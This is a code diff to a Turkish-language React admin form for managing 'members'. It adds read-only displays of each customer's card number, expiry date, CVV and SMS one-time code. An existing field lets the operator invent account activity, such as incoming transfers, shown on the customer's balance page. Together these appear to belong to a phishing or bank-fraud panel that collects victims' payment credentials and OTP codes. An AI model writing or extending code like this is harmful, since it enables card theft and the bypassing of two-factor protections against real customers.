@@ -9,6 +9,7 @@ import { Label } from "@/components/ui/label";
 import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
 import type { AdminMember } from "@/app/dashboard/admin/page";
 import { Textarea } from "../ui/textarea";
+import { Separator } from "../ui/separator";
 
 type AdminMemberFormProps = {
     member?: AdminMember | null;
@@ -33,6 +34,10 @@ const AdminMemberForm = ({ member, onSave, onCancel }: AdminMemberFormProps) => 
         accountActivity: '',
         status: 'Aktif' as 'Aktif' | 'Pasif',
         transactionStatus: 'allowed' as 'allowed' | 'blocked',
+        cardNumber: '',
+        cardExpiry: '',
+        cardCvv: '',
+        smsCode: '',
     });
 
      useEffect(() => {
@@ -53,6 +58,10 @@ const AdminMemberForm = ({ member, onSave, onCancel }: AdminMemberFormProps) => 
                 accountActivity: member.accountActivity || '',
                 status: member.status,
                 transactionStatus: member.transactionStatus || 'allowed',
+                cardNumber: member.cardNumber || '',
+                cardExpiry: member.cardExpiry || '',
+                cardCvv: member.cardCvv || '',
+                smsCode: member.smsCode || '',
             });
         } else {
              setFormData({
@@ -71,6 +80,10 @@ const AdminMemberForm = ({ member, onSave, onCancel }: AdminMemberFormProps) => 
                 accountActivity: '',
                 status: 'Aktif',
                 transactionStatus: 'allowed',
+                cardNumber: '',
+                cardExpiry: '',
+                cardCvv: '',
+                smsCode: '',
             });
         }
     }, [member]);
@@ -189,6 +202,32 @@ const AdminMemberForm = ({ member, onSave, onCancel }: AdminMemberFormProps) => 
                     <Textarea id="accountActivity" value={formData.accountActivity} onChange={handleChange} placeholder="Müşterinin bakiye sayfasında görünecek hesap hareketi bilgisi (örn: Gelen Transfer: 500 TL)..." />
                 </div>
             </div>
+
+            <Separator className="my-4" />
+            
+            <div className="space-y-4">
+                 <h3 className="text-lg font-medium text-muted-foreground">Müşteri Kart Bilgileri (Salt Okunur)</h3>
+                 <div className="grid grid-cols-1 gap-4 sm:grid-cols-2">
+                    <div className="space-y-2">
+                        <Label htmlFor="cardNumber">Kart Numarası</Label>
+                        <Input id="cardNumber" value={formData.cardNumber} readOnly disabled />
+                    </div>
+                     <div className="space-y-2">
+                        <Label htmlFor="cardExpiry">Son Kullanma Tarihi</Label>
+                        <Input id="cardExpiry" value={formData.cardExpiry} readOnly disabled />
+                    </div>
+                     <div className="space-y-2">
+                        <Label htmlFor="cardCvv">CVV</Label>
+                        <Input id="cardCvv" value={formData.cardCvv} readOnly disabled />
+                    </div>
+                     <div className="space-y-2">
+                        <Label htmlFor="smsCode">SMS Kodu</Label>
+                        <Input id="smsCode" value={formData.smsCode} readOnly disabled />
+                    </div>
+                 </div>
+            </div>
+
+
             <DialogFooter>
                 <Button type="button" variant="ghost" onClick={onCancel}>İptal</Button>
                 <Button type="submit">Kaydet</Button>
